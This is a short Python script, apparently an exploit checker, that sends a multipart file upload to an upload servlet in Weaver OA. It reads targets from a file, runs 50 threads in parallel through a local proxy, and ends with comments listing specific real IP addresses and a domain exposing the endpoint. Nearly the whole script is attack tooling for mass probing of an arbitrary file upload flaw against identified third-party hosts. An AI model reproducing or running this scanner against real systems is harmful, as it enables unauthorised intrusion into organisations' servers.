
import requests
import warnings
warnings.filterwarnings("ignore")

def exp(u):
    url = f"{u}/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image"
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
        "Content-Type": "multipart/form-data; boundary=--------1638451160",
    }

    proxy = {
    'http':'http://127.0.0.1:8080',
    'https':'https://127.0.0.1:8080',
    }
    data = (
        "----------1638451160\r\n"
        "Content-Disposition: form-data; name=\"test\"; filename=\"test.txt\"\r\n"
        "Content-Type: application/octet-stream\r\n"
        "\r\n"
        "test\r\n"
        "----------1638451160--\r\n"
    )
    # try:
    response = requests.post(url, data=data ,timeout=3,headers=header,proxies= proxy,allow_redirects=False)
    print(response.status_code)
        # print(response)
    # except:
    #     pass


from concurrent.futures import ThreadPoolExecutor
# 批量检测
with open('urls.txt', 'r') as file:
    urls = [u.strip() for u in file.readlines()][200:]
with ThreadPoolExecutor(max_workers=50) as executor:
    executor.map(exp, urls)


# http://111.203.26.63/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image
# http://114.117.242.98/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image
# http://oatest.sunhope.cn/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image
# http://47.95.115.79/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image
# http://120.132.96.237/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image
# http://121.36.84.180/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image
# http://218.4.144.238/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image